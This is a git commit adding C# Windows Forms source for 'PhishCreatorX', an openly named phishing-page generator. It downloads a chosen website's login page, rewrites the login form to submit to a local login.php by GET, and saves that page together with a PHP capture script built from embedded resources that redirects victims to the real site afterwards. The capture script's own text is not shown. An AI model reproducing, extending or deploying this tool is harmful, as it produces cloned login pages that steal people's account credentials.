19e87dfdf18f2497df918a0f7ae1595245c13d50
YasserGersy <gersy.ch2@gmail.com>
2015-01-21 07:43:05 -0500

    --

---
+++ PhishCreatorX/Form1.Designer.cs
@@ -0,0 +1,269 @@
+﻿namespace PhishCreatorX
+{
+    partial class frmPhishMain
+    {
+        /// <summary>
+        /// Required designer variable.
+        /// </summary>
+        private System.ComponentModel.IContainer components = null;
+
+        /// <summary>
+        /// Clean up any resources being used.
+        /// </summary>
+        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
+        protected override void Dispose(bool disposing)
+        {
+            if (disposing && (components != null))
+            {
+                components.Dispose();
+            }
+            base.Dispose(disposing);
+        }
+
+        #region Windows Form Designer generated code
+
+        /// <summary>
+        /// Required method for Designer support - do not modify
+        /// the contents of this method with the code editor.
+        /// </summary>
+        private void InitializeComponent()
+        {
+            this.txbx_url = new System.Windows.Forms.TextBox();
+            this.cmbx_urls = new System.Windows.Forms.ComboBox();
+            this.label1 = new System.Windows.Forms.Label();
+            this.txbx_Directory = new System.Windows.Forms.TextBox();
+            this.label2 = new System.Windows.Forms.Label();
+            this.txbx_redirect = new System.Windows.Forms.TextBox();
+            this.lbl_Redirect = new System.Windows.Forms.Label();
+            this.btn_submit = new System.Windows.Forms.Button();
+            this.label3 = new System.Windows.Forms.Label();
+            this.cmbx_pro_langs = new System.Windows.Forms.ComboBox();
+            this.groupBox1 = new System.Windows.Forms.GroupBox();
+            this.label4 = new System.Windows.Forms.Label();
+            this.groupBox2 = new System.Windows.Forms.GroupBox();
+            this.panelYoutube = new System.Windows.Forms.Panel();
+            this.panel_twitter = new System.Windows.Forms.Panel();
+            this.panel_fb = new System.Windows.Forms.Panel();
+            this.groupBox1.SuspendLayout();
+            this.groupBox2.SuspendLayout();
+            this.SuspendLayout();
+            // 
+            // txbx_url
+            // 
+            this.txbx_url.Font = new System.Drawing.Font("Comic Sans MS", 6F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.txbx_url.Location = new System.Drawing.Point(130, 30);
+            this.txbx_url.Name = "txbx_url";
+            this.txbx_url.Size = new System.Drawing.Size(253, 19);
+            this.txbx_url.TabIndex = 0;
+            this.txbx_url.Text = " ";
+            this.txbx_url.TextChanged += new System.EventHandler(this.textBox1_TextChanged);
+            // 
+            // cmbx_urls
+            // 
+            this.cmbx_urls.FlatStyle = System.Windows.Forms.FlatStyle.Popup;
+            this.cmbx_urls.FormattingEnabled = true;
+            this.cmbx_urls.Location = new System.Drawing.Point(395, 25);
+            this.cmbx_urls.Name = "cmbx_urls";
+            this.cmbx_urls.Size = new System.Drawing.Size(75, 23);
+            this.cmbx_urls.TabIndex = 2;
+            this.cmbx_urls.Visible = false;
+            this.cmbx_urls.SelectedIndexChanged += new System.EventHandler(this.cmbx_urls_SelectedIndexChanged);
+            // 
+            // label1
+            // 
+            this.label1.AutoSize = true;
+            this.label1.ForeColor = System.Drawing.Color.Snow;
+            this.label1.Location = new System.Drawing.Point(55, 28);
+            this.label1.Name = "label1";
+            this.label1.Size = new System.Drawing.Size(69, 15);
+            this.label1.TabIndex = 3;
+            this.label1.Text = "Website Url";
+            // 
+            // txbx_Directory
+            // 
+            this.txbx_Directory.Font = new System.Drawing.Font("Comic Sans MS", 6F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.txbx_Directory.Location = new System.Drawing.Point(130, 116);
+            this.txbx_Directory.Name = "txbx_Directory";
+            this.txbx_Directory.Size = new System.Drawing.Size(208, 19);
+            this.txbx_Directory.TabIndex = 0;
+            this.txbx_Directory.TextChanged += new System.EventHandler(this.textBox1_TextChanged);
+            // 
+            // label2
+            // 
+            this.label2.AutoSize = true;
+            this.label2.ForeColor = System.Drawing.Color.Snow;
+            this.label2.Location = new System.Drawing.Point(56, 120);
+            this.label2.Name = "label2";
+            this.label2.Size = new System.Drawing.Size(46, 15);
+            this.label2.TabIndex = 3;
+            this.label2.Text = "Save at";
+            // 
+            // txbx_redirect
+            // 
+            this.txbx_redirect.Font = new System.Drawing.Font("Comic Sans MS", 6F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.txbx_redirect.Location = new System.Drawing.Point(130, 73);
+            this.txbx_redirect.Name = "txbx_redirect";
+            this.txbx_redirect.Size = new System.Drawing.Size(253, 19);
+            this.txbx_redirect.TabIndex = 0;
+            this.txbx_redirect.Text = " ";
+            this.txbx_redirect.TextChanged += new System.EventHandler(this.textBox1_TextChanged);
+            // 
+            // lbl_Redirect
+            // 
+            this.lbl_Redirect.AutoSize = true;
+            this.lbl_Redirect.ForeColor = System.Drawing.Color.Snow;
+            this.lbl_Redirect.Location = new System.Drawing.Point(55, 77);
+            this.lbl_Redirect.Name = "lbl_Redirect";
+            this.lbl_Redirect.Size = new System.Drawing.Size(51, 15);
+            this.lbl_Redirect.TabIndex = 3;
+            this.lbl_Redirect.Text = "Redirect";
+            // 
+            // btn_submit
+            // 
+            this.btn_submit.Enabled = false;
+            this.btn_submit.Location = new System.Drawing.Point(206, 191);
+            this.btn_submit.Name = "btn_submit";
+            this.btn_submit.Size = new System.Drawing.Size(75, 23);
+            this.btn_submit.TabIndex = 1;
+            this.btn_submit.Text = "Go";
+            this.btn_submit.UseVisualStyleBackColor = true;
+            this.btn_submit.Click += new System.EventHandler(this.btn_submit_Click);
+            // 
+            // label3
+            // 
+            this.label3.AutoSize = true;
+            this.label3.ForeColor = System.Drawing.Color.Snow;
+            this.label3.Location = new System.Drawing.Point(55, 162);
+            this.label3.Name = "label3";
+            this.label3.Size = new System.Drawing.Size(48, 15);
+            this.label3.TabIndex = 3;
+            this.label3.Text = "ProLang";
+            // 
+            // cmbx_pro_langs
+            // 
+            this.cmbx_pro_langs.FlatStyle = System.Windows.Forms.FlatStyle.Popup;
+            this.cmbx_pro_langs.Font = new System.Drawing.Font("Comic Sans MS", 6F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.cmbx_pro_langs.FormattingEnabled = true;
+            this.cmbx_pro_langs.Items.AddRange(new object[] {
+            "PHP"});
+            this.cmbx_pro_langs.Location = new System.Drawing.Point(130, 159);
+            this.cmbx_pro_langs.Name = "cmbx_pro_langs";
+            this.cmbx_pro_langs.Size = new System.Drawing.Size(253, 18);
+            this.cmbx_pro_langs.TabIndex = 2;
+            this.cmbx_pro_langs.Visible = false;
+            // 
+            // groupBox1
+            // 
+            this.groupBox1.BackColor = System.Drawing.Color.Transparent;
+            this.groupBox1.Controls.Add(this.btn_submit);
+            this.groupBox1.Controls.Add(this.label1);
+            this.groupBox1.Controls.Add(this.label3);
+            this.groupBox1.Controls.Add(this.txbx_url);
+            this.groupBox1.Controls.Add(this.lbl_Redirect);
+            this.groupBox1.Controls.Add(this.label4);
+            this.groupBox1.Controls.Add(this.label2);
+            this.groupBox1.Controls.Add(this.txbx_Directory);
+            this.groupBox1.Controls.Add(this.cmbx_pro_langs);
+            this.groupBox1.Controls.Add(this.txbx_redirect);
+            this.groupBox1.Controls.Add(this.cmbx_urls);
+            this.groupBox1.Location = new System.Drawing.Point(6, 0);
+            this.groupBox1.Name = "groupBox1";
+            this.groupBox1.Size = new System.Drawing.Size(478, 220);
+            this.groupBox1.TabIndex = 4;
+            this.groupBox1.TabStop = false;
+            // 
+            // label4
+            // 
+            this.label4.AutoSize = true;
+            this.label4.ForeColor = System.Drawing.Color.Snow;
+            this.label4.Location = new System.Drawing.Point(352, 116);
+            this.label4.Name = "label4";
+            this.label4.Size = new System.Drawing.Size(31, 15);
+            this.label4.TabIndex = 3;
+            this.label4.Text = "Load";
+            this.label4.Click += new System.EventHandler(this.label4_Click);
+            // 
+            // groupBox2
+            // 
+            this.groupBox2.BackColor = System.Drawing.Color.Transparent;
+            this.groupBox2.Controls.Add(this.panelYoutube);
+            this.groupBox2.Controls.Add(this.panel_twitter);
+            this.groupBox2.Controls.Add(this.panel_fb);
+            this.groupBox2.Location = new System.Drawing.Point(6, 220);
+            this.groupBox2.Name = "groupBox2";
+            this.groupBox2.Size = new System.Drawing.Size(478, 35);
+            this.groupBox2.TabIndex = 5;
+            this.groupBox2.TabStop = false;
+            // 
+            // panelYoutube
+            // 
+            this.panelYoutube.BackgroundImage = global::PhishCreatorX.Properties.Resources.tw;
+            this.panelYoutube.Location = new System.Drawing.Point(72, 12);
+            this.panelYoutube.Name = "panelYoutube";
+            this.panelYoutube.Size = new System.Drawing.Size(21, 17);
+            this.panelYoutube.TabIndex = 0;
+            this.panelYoutube.Click += new System.EventHandler(this.panelYoutube_Click);
+            // 
+            // panel_twitter
+            // 
+            this.panel_twitter.BackgroundImage = global::PhishCreatorX.Properties.Resources.twitter;
+            this.panel_twitter.Location = new System.Drawing.Point(45, 12);
+            this.panel_twitter.Name = "panel_twitter";
+            this.panel_twitter.Size = new System.Drawing.Size(21, 17);
+            this.panel_twitter.TabIndex = 0;
+            this.panel_twitter.Click += new System.EventHandler(this.panel_twitter_Click);
+            // 
+            // panel_fb
+            // 
+            this.panel_fb.BackgroundImage = global::PhishCreatorX.Properties.Resources.fb;
+            this.panel_fb.Location = new System.Drawing.Point(18, 12);
+            this.panel_fb.Name = "panel_fb";
+            this.panel_fb.Size = new System.Drawing.Size(21, 17);
+            this.panel_fb.TabIndex = 0;
+            this.panel_fb.Click += new System.EventHandler(this.panel_fb_Click);
+            // 
+            // frmPhishMain
+            // 
+            this.AutoScaleDimensions = new System.Drawing.SizeF(7F, 15F);
+            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
+            this.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(64)))), ((int)(((byte)(64)))), ((int)(((byte)(64)))));
+            this.BackgroundImage = global::PhishCreatorX.Properties.Resources.Gogler;
+            this.ClientSize = new System.Drawing.Size(488, 261);
+            this.Controls.Add(this.groupBox2);
+            this.Controls.Add(this.groupBox1);
+            this.Font = new System.Drawing.Font("Comic Sans MS", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedSingle;
+            this.MaximizeBox = false;
+            this.MinimizeBox = false;
+            this.Name = "frmPhishMain";
+            this.Opacity = 0.96D;
+            this.Text = "Phish CreatorX";
+            this.Load += new System.EventHandler(this.frmPhishMain_Load);
+            this.groupBox1.ResumeLayout(false);
+            this.groupBox1.PerformLayout();
+            this.groupBox2.ResumeLayout(false);
+            this.ResumeLayout(false);
+
+        }
+
+        #endregion
+
+        private System.Windows.Forms.TextBox txbx_url;
+        private System.Windows.Forms.ComboBox cmbx_urls;
+        private System.Windows.Forms.Label label1;
+        private System.Windows.Forms.TextBox txbx_Directory;
+        private System.Windows.Forms.Label label2;
+        private System.Windows.Forms.TextBox txbx_redirect;
+        private System.Windows.Forms.Label lbl_Redirect;
+        private System.Windows.Forms.Button btn_submit;
+        private System.Windows.Forms.Label label3;
+        private System.Windows.Forms.ComboBox cmbx_pro_langs;
+        private System.Windows.Forms.GroupBox groupBox1;
+        private System.Windows.Forms.GroupBox groupBox2;
+        private System.Windows.Forms.Label label4;
+        private System.Windows.Forms.Panel panel_fb;
+        private System.Windows.Forms.Panel panelYoutube;
+        private System.Windows.Forms.Panel panel_twitter;
+    }
+}
+
---
+++ PhishCreatorX/Form1.cs
@@ -0,0 +1,256 @@
+﻿using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Drawing;
+using System.Linq;
+using System.Text;
+using System.Windows.Forms;
+using System.IO;
+using System.Net;
+
+namespace PhishCreatorX
+{
+    public partial class frmPhishMain : Form
+    {
+        private List<string> Websites = new List<string>();
+        string Dir = Application.StartupPath;
+        public frmPhishMain()
+        {
+            InitializeComponent();
+            this.ShowIcon = false;
+        }
+        
+        private void frmPhishMain_Load(object sender, EventArgs e)
+        {
+            cmbx_pro_langs.SelectedIndex = 0;
+            Load_Websites();
+            if (cmbx_urls.Items.Count > 0)
+            {
+                cmbx_urls.Visible = true;
+                cmbx_urls.SelectedIndex = 0;
+            }
+        }
+
+        private void Load_Websites()
+        {
+            cmbx_urls.Items.Clear();
+            string webs_path = Application.StartupPath + "\\websites";
+            if (File.Exists(webs_path))
+            {
+                string[] urls = File.ReadAllLines(webs_path);
+                foreach (string line in urls)
+                    if (line.Length > 3)
+                    {
+                        Websites.Add(line);
+                        cmbx_urls.Items.Add(URL_To_Name(line));
+                    }
+            }
+            else return;
+            
+        }
+       
+        public  bool Is_Valid_url( string u)
+        {
+            try
+            {
+                new Uri(u);
+                return true;
+            }
+            catch
+            {
+                return false;
+            }
+        }
+        private void textBox1_TextChanged(object sender, EventArgs e)
+        {
+
+          btn_submit.Enabled=Is_Valid_url(txbx_url.Text);
+
+
+        }
+
+        private void Add_New_website()
+        {
+            bool found = false;
+            string websites_path = Application.StartupPath + "\\websites";
+            string Webs = File.ReadAllText(websites_path);
+            foreach (string site in Websites)
+                if (URL_To_Name(site) == URL_To_Name(txbx_url.Text))
+                {
+                    found = true;
+                    break;
+                }
+            if (!found)
+                File.WriteAllText(websites_path, Webs + Environment.NewLine + txbx_url.Text);
+        }
+        public string URL_To_Name(string url)
+        {
+            //http://www.ask.fm/yassergersy
+            string result = "";
+            if (url.Contains("http:") || url.Contains("https:"))
+                result = url.Split(new char[] { ':' })[1];
+            //www.ask.fm/yassergersy
+            if (url.Contains("www.")) 
+                result = url.Split(new char[] { '.' })[1];
+            //ask.fm/yassergersy
+            while(result[0]=='/')
+            {
+                result=result.Substring(1);
+            }
+            if (result.Contains("/"))
+                result = result.Split(new char[] { '/' })[0];
+
+          return result;
+        }
+
+        private void cmbx_urls_SelectedIndexChanged(object sender, EventArgs e)
+        {
+            if (cmbx_urls.SelectedIndex == -1)
+                return;
+            txbx_url.Text = Websites[cmbx_urls.SelectedIndex];
+        }
+
+        private void btn_Load_dir_Click(object sender, EventArgs e)
+        {
+            
+        }
+        public static String Get_Source_code(string Url)
+        {
+            string result = "";
+            
+            try
+            {
+                HttpWebRequest myRequest = (HttpWebRequest)WebRequest.Create(Url);
+                myRequest.Method = "GET";
+                WebResponse myResponse = myRequest.GetResponse();
+                StreamReader sr = new StreamReader(myResponse.GetResponseStream(), System.Text.Encoding.UTF8);
+                 result = sr.ReadToEnd();
+
+                 sr.Close();
+                 myResponse.Close();
+                 return result;
+            }
+            catch (Exception ex)
+            {
+                MessageBox.Show(ex.Message,"Phish CreatorX");
+                 return null;
+            }
+        }
+
+        private void btn_submit_Click(object sender, EventArgs e)
+        {
+            if (txbx_url.Text.Length < 3)
+                return;
+            if (txbx_Directory.Text.Length < 2)
+            {
+                MessageBox.Show("Please Select a directory to save in ", "YasserGersy");
+                FolderBrowserDialog f = new FolderBrowserDialog();
+                if (f.ShowDialog() == DialogResult.OK)
+                    txbx_Directory.Text = f.SelectedPath;
+            }
+            if (txbx_redirect.Text.Length < 3 || Is_Valid_url(txbx_redirect.Text) == false)
+                txbx_redirect.Text = txbx_url.Text;
+            string websiteName = URL_To_Name(txbx_url.Text);
+            Dir = txbx_Directory.Text+ "\\" + websiteName;
+          
+            string index_path = Dir + "\\index.php";
+            string login_path = Dir+"\\login.php";
+            
+            string Login_source = PhishCreatorX.Properties.Resources.php_script_bef + txbx_redirect.Text + PhishCreatorX.Properties.Resources.php_script_after;
+            string index_source = "";
+
+            index_source = Get_Source_code(txbx_url.Text);
+            if (index_source == null)
+                return;
+            index_source = Edit_document(index_source);
+            if (index_source == null)
+            {
+
+                MessageBox.Show("Can not Found Login Form "+Environment.NewLine+"Make Sure You Provided The right Url","Phish CreatorX");
+                return;
+            }
+         
+            if (Directory.Exists(Dir) == false)
+              Directory.CreateDirectory(Dir);
+            
+            //if (!File.Exists(index_path))
+             //   File.Create(index_path);
+           // if (!File.Exists(login_path))
+          //     File.Create(login_path);
+            File.WriteAllText(index_path, index_source);
+            File.WriteAllText(login_path, Login_source);
+
+            if (MessageBox.Show("Suucceeded ", "PhishCreatorX By Gersy", MessageBoxButtons.YesNo) == DialogResult.Yes)
+                System.Diagnostics.Process.Start("explorer", Dir);
+            
+             Add_New_website();
+        }
+        private string Edit_document(string content)
+        {
+            bool FormFounded = false;
+            string[] cons = content.Split(new char [] {'<'});
+            content=(content[0]=='<')?"<":"";
+            foreach (string line in cons) // <form > <h1> g</h1>  | form> h1>
+                if(line=="" || line==" ")
+                    continue;
+                else if (line.Contains("form") && line.Contains("method") && line.Contains("action"))
+                {
+                    FormFounded = true;
+                    string formTag = "";
+                    formTag = line.Replace("action", "action='login.php' gen");
+
+                    formTag = formTag.Replace("method", "method='GET' tmp=");
+               content+=("<"+formTag+Environment.NewLine);
+                    //   content += ("<form method='GET' action='login.php' >" + Environment.NewLine);
+                }
+                else content += ("<" + line + Environment.NewLine);
+            if (FormFounded)
+                return content;
+            else return null;
+        }
+
+        private void button1_Click(object sender, EventArgs e)
+        {
+        }
+
+        private void button2_Click(object sender, EventArgs e)
+        {
+        }
+
+        private void button1_Click_1(object sender, EventArgs e)
+        {
+
+            }
+
+        private void button1_Click_2(object sender, EventArgs e)
+        {
+        }
+
+        private void label4_Click(object sender, EventArgs e)
+        {
+            FolderBrowserDialog f = new FolderBrowserDialog();
+            if (f.ShowDialog() == DialogResult.OK)
+                txbx_Directory.Text = f.SelectedPath;
+
+        }
+
+        private void panel_twitter_Click(object sender, EventArgs e)
+        {
+
+            System.Diagnostics.Process.Start("https://twiiter.com/yassergersy");
+        }
+
+        private void panel_fb_Click(object sender, EventArgs e)
+        {
+            System.Diagnostics.Process.Start("https://facebook.com/prince.gersy2");
+        
+        }
+
+        private void panelYoutube_Click(object sender, EventArgs e)
+        {
+            System.Diagnostics.Process.Start("https://youtube.com/gersy.ch2");
+        
+        }
+    }
+}
